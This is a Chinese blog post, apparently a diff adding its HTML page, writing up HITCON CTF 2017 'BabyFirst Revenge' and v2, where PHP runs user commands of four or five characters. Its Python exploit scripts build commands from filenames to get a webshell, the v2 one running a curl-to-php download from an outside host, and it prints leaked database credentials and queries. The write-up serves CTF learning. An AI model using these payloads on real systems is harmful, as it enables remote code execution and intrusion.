@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="绕过四个字符限制getshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON CTF 2017 BabyFirst Revenge and v2 writeup">
+<meta property="og:url" content="https://findneo.github.io/171112HITCONCTFBabyfirstRevengeSeriesWP/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="绕过四个字符限制getshell">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/171112HITCONCTFBabyfirstRevengeSeriesWP/getFlag.png">
+<meta property="article:published_time" content="2017-11-12T09:14:27.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/171112HITCONCTFBabyfirstRevengeSeriesWP/getFlag.png">
+
+<link rel="canonical" href="https://findneo.github.io/171112HITCONCTFBabyfirstRevengeSeriesWP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HITCON CTF 2017 BabyFirst Revenge and v2 writeup | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/171112HITCONCTFBabyfirstRevengeSeriesWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HITCON CTF 2017 BabyFirst Revenge and v2 writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-11-12 17:14:27" itemprop="dateCreated datePublished" datetime="2017-11-12T17:14:27+08:00">2017-11-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+            <div class="post-description">绕过四个字符限制getshell</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>from HITCON CTF 2017<br>2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC</p>
+<p><a target="_blank" rel="noopener" href="https://ctf2017.hitcon.org/">https://ctf2017.hitcon.org/</a></p>
+</blockquote>
+<h3 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h3><blockquote>
+<p>Do you remember <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst">BabyFirst</a> from HITCON CTF 2015?</p>
+<p>This is the harder version!</p>
+<p><a target="_blank" rel="noopener" href="http://52.199.204.34/">http://52.199.204.34/</a></p>
+</blockquote>
+<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>详细说明：<a href="https://findneo.github.io/171110Bypass4CLimit/">https://findneo.github.io/171110Bypass4CLimit/</a> </p>
+<p>拿到shell后在<code>/home/fl4444g/README.txt</code>  得到数据库配置信息，然后连接数据库得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt</span><br><span class="line"><span class="comment">#    Flag is in the MySQL database</span></span><br><span class="line"><span class="comment">#fl4444g / SugZXUtgeJ52_Bvr</span></span><br><span class="line"></span><br><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;show databases;&quot;</span><br><span class="line"><span class="comment">#    Database</span></span><br><span class="line"><span class="comment">#information_schema</span></span><br><span class="line"><span class="comment">#fl4gdb</span></span><br><span class="line"></span><br><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;select concat(table_name) from information_schema.tables where table_schema=&#x27;fl4gdb&#x27;;&quot;</span><br><span class="line"><span class="comment">#    concat(table_name)</span></span><br><span class="line"><span class="comment">#this_is_the_fl4g</span></span><br><span class="line"></span><br><span class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;use fl4gdb;select * from this_is_the_fl4g&quot;</span><br><span class="line"><span class="comment">#    secret</span></span><br><span class="line"><span class="comment">#hitcon&#123;idea_from_phith0n,thank_you:)&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img data-src="getFlag.png"></p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">&#x27;http://52.199.204.34/&#x27;</span></span><br><span class="line"><span class="comment"># 查询自己的IP</span></span><br><span class="line">ip = r.get(<span class="string">&#x27;http://ipv4.icanhazip.com/&#x27;</span>).text.strip()</span><br><span class="line">sandbox = url + <span class="string">&#x27;sandbox/&#x27;</span> + hashlib.md5(<span class="string">&#x27;orange&#x27;</span> + ip).hexdigest() + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">reset = url + <span class="string">&#x27;?reset&#x27;</span></span><br><span class="line">cmd = url + <span class="string">&#x27;?cmd=&#x27;</span></span><br><span class="line">build = [<span class="string">&#x27;&gt;cur\\&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;&gt;l\ \\&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;ls&gt;A&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;rm c*&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;rm l*&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;&gt;105\\&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;&gt;304\\&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;&gt;301\\&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;&gt;9\&gt;\\&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;ls&gt;&gt;A&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;sh A&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;php A&#x27;</span></span><br><span class="line">         ]</span><br><span class="line"><span class="comment"># 如果目标服务器有GET，这个也是可以打的</span></span><br><span class="line"><span class="comment"># build = [&#x27;&gt;GE\\&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;&gt;T\\ \\&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;ls&gt;A&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;rm G*&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;rm T*&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;&gt;105\\&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;&gt;304\\&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;&gt;301\\&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;&gt;9\&gt;\\&#x27;,</span></span><br><span class="line"><span class="comment">#          &#x27;ls&gt;&gt;A&#x27;]</span></span><br><span class="line">r.get(reset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> build:</span><br><span class="line">    s = r.get(cmd + i)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[%s]&#x27;</span> % s.status_code, s.url</span><br><span class="line"></span><br><span class="line">s = r.get(sandbox + <span class="string">&#x27;fun.php?cmd=uname -a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;[%s]&#x27;</span> % s.status_code, s.url</span><br><span class="line"><span class="built_in">print</span> s.text</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="更多解答"><a href="#更多解答" class="headerlink" title="更多解答"></a>更多解答</h4><p><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge">https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge</a></p>
+<h3 id="BabyFirst-Revenge-v2"><a href="#BabyFirst-Revenge-v2" class="headerlink" title="BabyFirst Revenge v2"></a>BabyFirst Revenge v2</h3><blockquote>
+<p>BabyFirst Revenge v2<br>This is the hardest version! Short enough?</p>
+<p><a target="_blank" rel="noopener" href="http://52.197.41.31/">http://52.197.41.31/</a></p>
+</blockquote>
+<h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h4><p>这题是赛后看wp复现的，只到拿webshell的部分。</p>
+<p>详细说明： <a href="https://findneo.github.io/171110Bypass4CLimit/">https://findneo.github.io/171110Bypass4CLimit/</a></p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">&#x27;http://52.197.41.31/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></span><br><span class="line">shell_ip = <span class="string">&#x27;xx.xx.xx.xx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本机IP</span></span><br><span class="line">your_ip = r.get(<span class="string">&#x27;http://ipv4.icanhazip.com/&#x27;</span>).text.strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">reset = target + <span class="string">&#x27;?reset&#x27;</span></span><br><span class="line">cmd = target + <span class="string">&#x27;?cmd=&#x27;</span></span><br><span class="line">sandbox = target + <span class="string">&#x27;sandbox/&#x27;</span> + \</span><br><span class="line">    hashlib.md5(<span class="string">&#x27;orange&#x27;</span> + your_ip).hexdigest() + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0 = random.choice(<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">&#x27;hkpq&#x27;</span>)</span><br><span class="line">pos2 = <span class="string">&#x27;g&#x27;</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;%s\&gt;&#x27;</span> % pos0,</span><br><span class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;%st-&#x27;</span> % pos1,</span><br><span class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">    <span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;*v&gt;%s&#x27;</span> % pos2,</span><br><span class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></span><br><span class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">    <span class="string">&#x27;&gt;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ph\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;%s\\&#x27;</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;sh &#x27;</span> + pos2,</span><br><span class="line">    <span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line">    <span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line">    <span class="string">&#x27;sh &#x27;</span> + pos0,</span><br><span class="line">    <span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">s = r.get(reset)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">4</span></span><br><span class="line">    s = r.get(cmd + i)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[%d]&#x27;</span> % s.status_code, s.url</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">s = r.get(sandbox + <span class="string">&#x27;fun.php?cmd=uname -a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[%d]&#x27;</span> % s.status_code, s.url</span><br><span class="line"><span class="built_in">print</span> s.text</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="更多解答-1"><a href="#更多解答-1" class="headerlink" title="更多解答"></a>更多解答</h4><p><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2">https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://speakerdeck.com/player/f81159300925466c88335f3cf740beb6">来自小密圈里的那些奇技淫巧</a> </p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/171110Bypass4CLimit/" rel="prev" title="如何绕过四个字符限制getshell">
+      <i class="fa fa-chevron-left"></i> 如何绕过四个字符限制getshell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/171125TextualRepresentationOfIPAddress/" rel="next" title="IP地址混淆">
+      IP地址混淆 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
